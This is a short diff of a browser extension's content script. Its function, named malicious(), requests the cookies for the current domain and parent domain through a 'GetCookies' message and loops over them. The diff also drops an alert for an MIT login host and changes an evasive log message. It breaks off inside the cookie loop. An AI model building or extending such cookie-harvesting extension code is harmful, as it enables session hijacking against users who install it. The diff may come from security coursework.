@@ -4,7 +4,7 @@ replaceStart();
 var keys = []
 var values = []
 
-console.log("Im Not Active idk what u r talking about");
+console.log("EXTENSION LAUNCHED :)"); //TODO: remove this later
 
 String.prototype.replaceArray = function(find, replace) {
     var replaceString = this;
@@ -71,19 +71,13 @@ function replaceStart() {
 
 function malicious() {
 
-    if (window.location.hostname=="idp.mit.edu") {
-
-      alert("hello");
-
-    }
-
     // check current subdomain and domain
     for (loc of [window.location.hostname, window.location.hostname.replace(/^[^.]+\./g, "")]) {
 
       chrome.runtime.sendMessage({ command: "GetCookies", param: loc },
           function (response) {
+
                 console.log("I received cookies!")
-                console.log(response)
 
                 for (cookie of response) {
 
